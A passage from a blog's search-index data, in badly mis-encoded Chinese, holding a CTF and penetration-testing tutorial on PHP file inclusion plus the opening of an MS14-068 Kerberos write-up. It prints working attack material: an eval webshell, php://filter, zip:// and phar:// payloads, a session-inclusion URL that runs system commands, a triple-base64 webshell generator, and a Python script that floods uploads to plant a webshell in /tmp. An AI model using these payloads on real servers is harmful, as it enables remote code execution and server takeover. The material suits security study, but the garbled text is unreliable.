","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:0","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"4.1 ä¸Šä¼ å¯æ§æ–‡ä»¶ æ¯”å¦‚è¯´æˆ‘ä»¬èƒ½å¤Ÿä¸Šä¼ å›¾ç‰‡ï¼Œé‚£å°±å»ä¼ ä¸€ä¸ªå¸¦å®Œæ•´ php ä»£ç çš„å›¾ç‰‡æ–‡ä»¶ï¼Œæˆ–è€…æ˜¯å°†ä»£ç æ–‡ä»¶æ”¹åç¼€å³å¯ å‹ç¼©åŒ…ï¼Œé…åˆä¼ªåè®® \u003c?php ?\u003e è¿‡æ»¤çš„æƒ…å†µï¼š \u003cscript language=\"php\"\u003e@eval($_POST['a']);\u003c/script\u003e ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:1","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"4.2 è¿œç¨‹æ–‡ä»¶åŒ…å« 4.2.1 æ¡ä»¶ allow_url_fopen æœ¬é€‰é¡¹æ¿€æ´»äº† URL å½¢å¼çš„ fopen å°è£…åè®®ä½¿å¾—å¯ä»¥è®¿é—® URL å¯¹è±¡ä¾‹å¦‚æ–‡ä»¶ã€‚é»˜è®¤çš„å°è£…åè®®æä¾›ç”¨ ftp å’Œ http åè®®æ¥è®¿é—®è¿œç¨‹æ–‡ä»¶ï¼Œä¸€äº›æ‰©å±•åº“ä¾‹å¦‚ zlib å¯èƒ½ä¼šæ³¨å†Œæ›´å¤šçš„å°è£…åè®®ã€‚ 4.2.2 è¿œç¨‹æ–‡ä»¶åŒ…å« [http|https|ftp]://www.bbb.com/shell.txt è‹¥åç¼€åå†™æ­»ï¼Œå¯ä»¥ç”¨ ? ç»•è¿‡ pyload: aaa.com/1.php?a ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:2","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"4.3 ä¼ªåè®® 4.3.1 PHP å½’æ¡£ phar:// zip:// DEMOï¼š http://106.12.37.37/index.php?url=upload payloadï¼š url=zip://a.zip#å‹ç¼©åŒ…å†…æ–‡ä»¶å url=phar://a.zip/å‹ç¼©åŒ…å†…æ–‡ä»¶å ä¸Šä¼ çš„æ–‡ä»¶æ— æ‰€è°“åç¼€åï¼Œåªè¦æ˜¯ zip æ–‡ä»¶å¤´çš„æ–‡ä»¶å‡å¯ï¼Œzip æ–‡ä»¶æ”¹æˆ jpgï¼Œzip:// åè®®ä»ç„¶å¯ä»¥è§£æ 4.3.2 åˆ©ç”¨ PHP æµ 4.3.2.1 php://filter å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚è¿™å¯¹äºä¸€ä½“å¼(all-in-one)çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€file() å’Œ file_get_contents()ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚ php://filter ç›®æ ‡ä½¿ç”¨ä»¥ä¸‹çš„å‚æ•°ä½œä¸ºå®ƒè·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚å¤åˆè¿‡æ»¤é“¾èƒ½å¤Ÿåœ¨ä¸€ä¸ªè·¯å¾„ä¸ŠæŒ‡å®šã€‚è¯¦ç»†ä½¿ç”¨è¿™äº›å‚æ•°å¯ä»¥å‚è€ƒå…·ä½“èŒƒä¾‹ã€‚ ?file=php://filter/read=convert.base64-encode/resource=index.php ?file=php://filter/read=string.toupper|string.rot13/resource=index.php é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ï¼š string.toupper //ä¸Šé¢æœ‰å†™ string.tolower //è½¬æ¢ä¸ºå°å†™ string.strip_tags //å»é™¤htmlå’Œphpæ ‡è®°ï¼Œæ¯”å¦‚\u003c?php?\u003e convert.base64-encode //base64ç¼–ç  convert.base64-decode //base64ç¼–ç  convert.quoted-printable-encode //quoted-printable è½¬ 8bit convert.quoted-printable-decode //åŒä¸Š DEMOï¼š http://chinalover.sinaapp.com/web7/index.php 4.3.2.2 php://input åˆ©ç”¨æ¡ä»¶ allow_url_include = On å¯¹ allow_url_fopen ä¸åšè¦æ±‚ php://input å¯ä»¥è¯»å–æ²¡æœ‰å¤„ç†è¿‡çš„ POST æ•°æ® Payload: Urlï¼š?key=123\u0026flag=php://input Postï¼š123 ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:3","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"4.4 æ—¥å¿—æ–‡ä»¶ å¾ˆå¤šæ—¶å€™ï¼Œweb æœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œæ¯”å¦‚è¯´ apache åœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼Œä¼šå°†è¯·æ±‚å†™å…¥ access error.logã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ—¥å¿—ä¿å­˜è·¯å¾„åœ¨ /var/log/apache2/ www ç”¨æˆ·æ— æƒé™è¯»å–è¯¥æ—¥å¿—ï¼Œåº”ç”¨åœºæ™¯æœ‰é™ã€‚ ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:4","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"4.5 SESSION PHP é»˜è®¤ç”Ÿæˆçš„ session æ–‡ä»¶å¾€å¾€å­˜æ”¾åœ¨ /tmp ç›®å½•ä¸‹ 4.5.1 session æ–‡ä»¶ æ³¨å†Œä¸€å¥è¯ç”¨æˆ·åï¼Œå¹¶åŒ…å« session æ–‡ä»¶http://512ab969d9ce414e9349e459f7bfe9d1b601c9951aa24093.changame.ichunqiu.com/action.php?module=\u0026file=../../../../../../../tmp/SESS/sess_tftrtvb6t089398jjl0p1cdvj7\u0026a=system(\"cat flag.php\"); 4.5.2 session.upload session.upload_progress.enabled è¿™ä¸ªå‚æ•°åœ¨ php.ini é»˜è®¤å¼€å¯ï¼Œéœ€è¦æ‰‹åŠ¨é…ç½®ä¸º OFFï¼Œå¦‚æœä¸æ˜¯ offï¼Œå°±ä¼šåœ¨ä¸Šä¼ çš„è¿‡ç¨‹ä¸­ç”Ÿæˆä¸Šä¼ è¿›åº¦æ–‡ä»¶ï¼Œå®ƒçš„å‡ºç°æœ¬æ˜¯ä¸ºäº†æ˜¾ç¤ºæ–‡ä»¶åœ¨ä¸Šä¼ æ—¶å€™çš„è¿›åº¦ï¼Œä»¥æ˜¾ç¤ºæ–‡ä»¶ä¸Šä¼ çš„ä¿¡æ¯ã€‚ å®ƒçš„å­˜å‚¨è·¯å¾„å¯ä»¥åœ¨ phpinfo ä¸­è·å–åˆ°ï¼ˆå¦‚ä¸Šå›¾ï¼‰ Demoï¼š \u003c?php ($_=@_GET['orange']) \u0026\u0026 @substr(file($_)[0],0,6) === '@\u003c?php' ? include($_) : highlight_file(__FILE__); ?\u003e è¿™ä¸ª session æ–‡ä»¶å¹¶ä¸ä¸€å®šè¦ session_start æ‰èƒ½ç”Ÿæˆï¼Œåªè¦å¾€æœåŠ¡å™¨å‘é€ä¸€ä¸ª Cookie: PHPSESSID=xxx çš„å€¼ï¼Œç„¶åç”¨ session upload çš„æ–¹å¼è¿›è¡Œä¸Šä¼ æ–‡ä»¶ï¼Œå°±ä¼šç”Ÿæˆè¿™æ ·ä¸€ä¸ª session æ–‡ä»¶ é€šè¿‡ curl ä¸Šä¼ æ–‡ä»¶ï¼š curl http://IP/index.php -H 'Cookie:PHPSESSID=iamnotorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=aaa' -F 'file=@/etc/passwd' è¿™æ ·å°±å¯ä»¥æ§åˆ¶æ–‡ä»¶åï¼Œæ¥ä¸‹æ¥æƒ³åŠæ³•æ§åˆ¶æ–‡ä»¶å†…å®¹ã€‚ ç”±äºæ–‡ä»¶ä¸Šä¼ çš„é€Ÿåº¦æ¯”è¾ƒå¿«ï¼Œæœ‰æ—¶å€™ç»å¸¸æ¥ä¸åŠçœ‹åˆ°ä¿å­˜åœ¨ session æ–‡ä»¶ä¸­çš„ upload ä¿¡æ¯ï¼Œå°±ä¼šè¢«åˆ é™¤ã€‚æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç›¸å¯¹æ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼Œå¹¶ä¸”æ¡ä»¶ç«äº‰çš„æ–¹å¼ã€‚æ¥å…ˆçœ‹ä¸€ä¸‹ä¿å­˜åœ¨ session ä¸­çš„æ–‡ä»¶å†…å®¹ã€‚ è¿™é‡Œæ„é€ äº†ä¸€ä¸ªè¿™æ ·çš„è¡¨å•ï¼Œupload.php \u003cform action=\"upload.php\" method=\"POST\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"hidden\" name=\"\u003c?php echo ini_get(\"session.upload_progress.name\"); ?\u003e\" value=\"iamnotorange\" /\u003e \u003cinput type=\"file\" name=\"file1\" /\u003e \u003cinput type=\"file\" name=\"file2\" /\u003e \u003cinput type=\"submit\" /\u003e \u003c/form\u003e \u003c?php session_start(); $name = ini_get('session.upload_progress.name'); $key = ini_get('session.upload_progress.prefix') . $_POST[$name]; var_dump($_SESSION[$key]); include '/var/lib/php/sessions/sess_iamnotorange'; ç„¶åå¼€ä¸ªå¤šçº¿ç¨‹è·‘å‡ æ¬¡ï¼Œå°±èƒ½çœ‹åˆ°é€šè¿‡æ¡ä»¶ç«äº‰è¯»å‡ºçš„æ–‡ä»¶å†…å®¹ï¼š å¯ä»¥å‘ç°æ–‡ä»¶ä¸­çš„ upload_progress_ å›ºå®šï¼Œä¸å¯æ§ã€‚ æ¥ä¸‹æ¥è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶æ˜¯ substr(file($_)[0],0,6) === '@\u003c?php'ï¼Œæƒ³åˆ°åˆ©ç”¨ php ä¸­çš„ä¼ªåè®®ï¼Œè¿›è¡Œæ–‡ä»¶å†…å®¹çš„ä¿®æ”¹ã€‚ å‚è€ƒï¼šhttps://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1 base64 çš„å‰ç½®çŸ¥è¯† base64ç¼–ç åçš„å­—ç¬¦ä¸²é›†ä¸º [0-9a-zA-Z+/=] å› è€Œåœ¨è§£ç çš„æ—¶å€™é‡åˆ°è¿™ä¸ªä¹‹å¤–çš„å­—ç¬¦ï¼Œå°±ä¼šè·³è¿‡é‚£äº›å­—ç¬¦ã€‚åªå¯¹åœ¨æ­¤èŒƒå›´å†…çš„å­—ç¬¦è¿›è¡Œè§£ç ã€‚ åœ¨æœ¬ä¾‹ä¸­ï¼Œ_ ä½œä¸ºç‰¹æ®Šå­—ç¬¦ï¼Œåœ¨ base64 è§£ç æ—¶ä¼šè‡ªåŠ¨è·³è¿‡ã€‚ æ‰€ä»¥åªè¦å¯¹å‰é¢çš„ upload_progress_ è¿›è¡Œè¶³å¤Ÿå¤šæ¬¡çš„è§£å¯†ï¼Œå°±å¯ä»¥ä½¿å…¶å˜æˆç©ºå­—ç¬¦ $i = 0 ; $data = \"upload_progress_\"; while(true){ $i += 1; $data = base64_decode($data); var_dump($data); if($data == ''){ echo \"ä¸€å…±è§£ç äº†:\".$i,\"æ¬¡\\n\"; break; } } é€šè¿‡è„šæœ¬å¯ä»¥çœ‹åˆ°ï¼Œåªè¦ä¸‰æ¬¡å°±å¯ä»¥å°†å‰é¢çš„å†…å®¹è½¬æ¢ä¸ºæˆç©ºã€‚ ä½†æ˜¯ï¼Œç”±äº base64 æ˜¯å¯¹ 4 ä¸ªå­—ç¬¦ä¸ºä¸€ç»„è¿›è¡Œè§£ç ã€‚upload_progress_ å¹¶ä¸æ»¡è¶³ä¸‰æ¬¡è§£ç åå…è®¸å­—ç¬¦æ˜¯ 4 çš„å€æ•°(14 ä¸ªæœ‰æ•ˆå­—ç¬¦ï¼Œè¦æ±‚æœ‰æ•ˆå­—ç¬¦è‡³å°‘æ˜¯ 16 ä¸ª)ï¼Œå°±ä¼šæŠŠåé¢çš„å­—ç¬¦ç®—å…¥å¡«å……ï¼Œä»è€Œç ´ååŸæœ‰ä¼ å…¥çš„ php ä»£ç ã€‚ ç¤ºä¾‹ function triple_base64_encode($str){ return base64_encode(base64_encode(base64_encode($str))); } function triple_base64_decode($str){ return base64_decode(base64_decode(base64_decode($str))); } $i = 0 ; $data = \"upload_progress_\".triple_base64_encode(\"\u003c?=\\`id\\`;\u003e\"); echo triple_base64_decode($data); è§£ç ä¹‹åçš„æ•°æ®æ˜¯ ? è€Œ upload_progress_ZZ åœ¨ä¸‰æ¬¡çš„è§£ç ä¸­ï¼Œç¬¬ä¸€æ¬¡è§£ç åç•™ä¸‹äº†å››ä¸ªå…è®¸å­—ç¬¦hikYï¼Œç¬¬äºŒæ¬¡è§£ç æ²¡æœ‰å…è®¸å­—ç¬¦ï¼Œç¬¬ä¸‰æ¬¡å°±å˜æˆäº†ç©ºã€‚ åœ¨è¿™ä¸‰æ¬¡ä¸­ï¼Œéƒ½æ˜¯å…è®¸å­—ç¬¦çš„æ•°é‡éƒ½æ˜¯ 4 çš„å€æ•°ï¼Œè¿™æ ·å°±ä¸ä¼šç ´ååé¢ä¼ å…¥çš„ php ä»£ç ã€‚ çˆ†ç ´è„šæœ¬ï¼š \u003c?php $str = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz\"; while(true) { $i = 0 ; $data = \"upload_progress_\".substr(str_shuffle($str),10,2); $s = base64_decode($data); $s_length = strlen(preg_replace('|[^a-z0-9A-Z+/]|s', '', $s)); $ss = base64_decode($s); $ss_length = strlen(preg_replace('|[^a-z0-9A-Z+/]|s', '', $ss)); $sss = base64_decode($ss); if($s_length%4==0 \u0026\u0026 $ss_length%4==0 \u0026\u0026 $sss=='') { echo $data; break; } } å¯¹äºåé¢çš„ php ä»£ç ï¼Œä¹Ÿæœ‰ä¸€ä¸ªè¦æ±‚ï¼Œå°±æ˜¯ä¸‰æ¬¡è§£å¯†ä¸­éƒ½ä¸èƒ½å‡ºç° =ï¼Œå› ä¸ºbase64ä¸­ = åªèƒ½æ”¾åœ¨ç¼–ç çš„æœ€åè¡¥ä½ï¼Œå‡ºç°åœ¨ä¸­é—´çš„è¯ï¼Œphp://filter/convert.base64-decode æµå°±æ— æ³•æ­£å¸¸è§£æï¼Œå°±ä¼šæŠ¥é”™ã€‚ å¯¹æ­¤ oragne å¸ˆå‚…å†™äº†ä¸ªè„šæœ¬ç”Ÿæˆè¿™ç©æ„ï¼š import string from base64 import b64encode from random import sample, randint payload = \"@\u003c?php file_put_contents('/tmp/web', '@\u003c?php eval($_GET[1])?\u003e'); ?\u003e\" while 1: junk = ''.join(sample(string.ascii_letters, randint(8, 16))) x = b64encode(payload + junk) xx = b64encode(b64encode(payload + junk)) xxx = b64encode(b64encode(b64encode(payload + junk))) if '=' not in x and '=' not in xx and '=' not in xxx: print(xxx) break VVVSM0wyTkhhSGRKUjFwd1lrZFdabU5JVmpCWU1rNTJZbTVTYkdKdVVucExRMk4yWkVjeGQwd3paR3haYVdOelNVTmtRVkJFT1hkaFNFRm5XbGhhYUdKRFoydFlNR1JHVmtaemVGaFRheTlRYVdOd1QzbEJMMUJzVGxGVmEwNUZWbXh3YTFSRk5UTmlNMHB6 ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:5","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"4.6 ./ é•¿æ–‡ä»¶åæˆªæ–­ payload:?page=phpinfo.txtâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. æˆ–page=phpinfo.txt././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:6","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"4.7 phpinfo å‘æœåŠ¡å™¨ä¸Šä»»æ„ php æ–‡ä»¶ä»¥ form-data å¼æäº¤è¯·æ±‚ä¸Šä¼ æ•°æ®æ—¶ï¼Œä¼šç”Ÿæˆä¸´æ—¶æ–‡ä»¶ï¼Œé€šè¿‡ phpinfo æ¥è·å–ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„ä»¥åŠåç§°ï¼Œç„¶åä¸´æ—¶æ–‡ä»¶åœ¨æçŸ­æ—¶é—´è¢«åˆ é™¤çš„æ—¶å€™ï¼Œéœ€è¦ç«äº‰æ—¶é—´åŒ…å«ä¸´æ—¶æ–‡ä»¶æ‹¿åˆ° webshell https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:7","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"4.8 PHP è‡ªåŒ…å« ä¸Šä¼  -\u003e ä¸´æ—¶æ–‡ä»¶ ä¼šè¯ç»“æŸ -\u003e åˆ é™¤ä¸´æ—¶æ–‡ä»¶ phpinfo() -\u003e ä¸´æ—¶æ–‡ä»¶å ä¸­æ–­åˆ é™¤çš„è¿‡ç¨‹ /a.php?include=a.php è¿™æ · a.php ä¼šå°†å®ƒè‡ªèº«åŒ…å«è¿›æ¥ï¼Œè€Œè¢«åŒ…å«è¿›æ¥çš„ a.php å†æ¬¡å°è¯•å¤„ç† url çš„åŒ…å«è¯·æ±‚æ—¶ï¼Œå†æ¬¡å°†è‡ªå·±åŒ…å«è¿›æ¥ï¼Œå½¢æˆäº†æ— ç©·é€’å½’ï¼Œé€’å½’ä¼šå¯¼è‡´çˆ†æ ˆï¼Œä½¿phpæ— æ³•è¿›è¡Œæ­¤æ¬¡è¯·æ±‚çš„åç»­å¤„ç†ï¼Œç„¶åå°±èƒ½è¿›è¡ŒåŒ…å«äº† è‡ªåŒ…å«ï¼Œå¯¼è‡´ php åœæ­¢ demoï¼š ã€Œç™¾åº¦æ¯ã€CTFæ¯”èµ› åäºŒæœˆåœº - Blog è¿›é˜¶ç‰ˆ æ³¨å†Œè´¦å·ï¼ŒPOST é¡µé¢å­˜åœ¨ insert å‹ SQL æ³¨å…¥è·å–ç®¡ç†å‘˜è´¦å· ç™»å½• admin è´¦å·ï¼Œå‘ç° manage é¡µé¢ä¸‹å­˜åœ¨åŒ…å« åˆ©ç”¨è‡ªåŒ…å«æ¼æ´ï¼Œåœ¨ tmp æ–‡ä»¶å¤¹ä¸‹ä¸Šä¼  webshell ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:8","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"4.9 PHP å´©æºƒ æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è®© php åŒ…å«è‡ªèº«ä»è€Œå¯¼è‡´æ­»å¾ªç¯ç„¶å php å°±ä¼šå´©æºƒï¼Œå¦‚æœè¯·æ±‚ä¸­åŒæ—¶å­˜åœ¨ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚çš„è¯,è¿™ä¸ªæ–‡ä»¶å°±ä¼šè¢«ä¿ç•™ include.php?file=php://filter/string.strip_tags/resource=/etc/passwd include.php?file=php://filter/string.strip_tags/resource=/etc/passwd å¯ä»¥å¯¼è‡´ php åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ Segment Fault æƒ³åˆ°å¯ä»¥åˆ©ç”¨åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¸­ ä¹‹å‰åœ¨ç½‘ä¸Šçš„åˆ†ææ–‡ç« ä¸­ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è®© php åŒ…å«è‡ªèº«ä»è€Œå¯¼è‡´æ­»å¾ªç¯ ç„¶å php å°±ä¼šå´©æºƒ , å¦‚æœè¯·æ±‚ä¸­åŒæ—¶å­˜åœ¨ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚çš„è¯ï¼Œè¿™ä¸ªæ–‡ä»¶å°±ä¼šè¢«ä¿ç•™ #!/usr/bin/env python # -*- coding: utf-8 -*- import requests import string import itertools charset = string.digits + string.letters host = \"192.168.43.155\" port = 80 base_url = \"http://%s:%d\" % (host, port) def upload_file_to_include(url, file_content): files = {'file': ('evil.jpg', file_content, 'image/jpeg')} try: response = requests.post(url, files=files) except Exception as e: print e def generate_tmp_files(): webshell_content = '\u003c?php eval($_REQUEST[c]);?\u003e'.encode( \"base64\").strip().encode(\"base64\").strip().encode(\"base64\").strip() file_content = '\u003c?php if(file_put_contents(\"/tmp/ssh_session_HD89q2\", base64_decode(\"%s\"))){echo \"flag\";}?\u003e' % ( webshell_content) phpinfo_url = \"%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd\" % ( base_url) length = 6 times = len(charset) ** (length / 2) for i in xrange(times): print \"[+] %d / %d\" % (i, times) upload_file_to_include(phpinfo_url, file_content) def main(): generate_tmp_files() if __name__ == \"__main__\": main() ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:9","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å¸¸ç”¨","ä»£ç å®¡è®¡","CTF","æ¸—é€æµ‹è¯•"],"content":"5 æ€»ç»“ å½“ä¸€ä¸ªç›®æ ‡å­˜åœ¨ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´çš„æ—¶å€™ï¼Œä½†æ‰¾ä¸åˆ°å¯ä»¥åŒ…å«çš„æ–‡ä»¶ï¼Œæ— æ³• getshellã€‚å¯ä»¥æœ‰ä¸‰ç§æ–¹æ³•ï¼š å€Ÿç”¨ phpinfoï¼ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶æ¥ getshell åˆ©ç”¨ PHP_SESSION_UPLOAD_PROGRESSï¼ŒåŒ…å« session æ–‡ä»¶æ¥ getshell åˆ©ç”¨ä¸€ä¸ªå¯ä»¥ä½¿ PHP æŒ‚æ‰çš„æ¼æ´ï¼ˆå¦‚å†…å­˜æ¼æ´ç­‰ï¼‰ï¼Œä½¿ PHP åœæ­¢æ‰§è¡Œï¼Œæ­¤æ—¶ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶å°±æ²¡æœ‰åˆ é™¤ã€‚æˆ‘ä»¬å¯ä»¥çˆ†ç ´ç¼“å­˜æ–‡ä»¶åæ¥ getshellã€‚ ","date":"2019-05-30","objectID":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:5:0","tags":["å¸¸ç”¨","CTF"],"title":"PHP æ–‡ä»¶åŒ…å«æ¼æ´","uri":"/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"MS14-068 æ¼æ´åˆ†æ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"MS14-068 æ¼æ´åˆ†æ","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"MS14-068 æ¼æ´åˆ†æ ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"MS14-068 æ¼æ´åˆ†æ","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 æ¼æ´ç®€ä»‹ 2014.11.18 æ—¥ï¼Œå¾®è½¯å‘å¸ƒ MS14-068 è¡¥ä¸ï¼Œä¿®å¤äº†ä¸€ä¸ªå½±å“å…¨éƒ¨ç‰ˆæœ¬ Windows æœåŠ¡å™¨çš„ä¸¥é‡æ¼æ´ã€‚ç”¨äºè§£å†³ Microsoft Windows Kerberos KDC æ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸é»‘å®¢æå‡ä»»æ„æ™®é€šç”¨æˆ·æƒé™æˆä¸ºåŸŸç®¡ç†å‘˜èº«ä»½ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æå‡çš„æƒé™æ§åˆ¶åŸŸä¸­æ‰€æœ‰çš„è®¡ç®—æœºï¼ŒåŒ…æ‹¬åŸŸæœåŠ¡å™¨ã€‚ ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"MS14-068 æ¼æ´åˆ†æ","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 åŸç†åˆ†æ ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"MS14-068 æ¼æ´åˆ†æ","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.1 kerberos è®¤è¯æµç¨‹ Server æ”¶åˆ° Client å‘æ¥çš„ TGS åï¼Œè¦æ ¹æ® TGS ä¸­ Client ç”³æ˜æ‰€åœ¨çš„åŸŸç»„ï¼Œå’Œ Server ä¸Šçš„ ACL 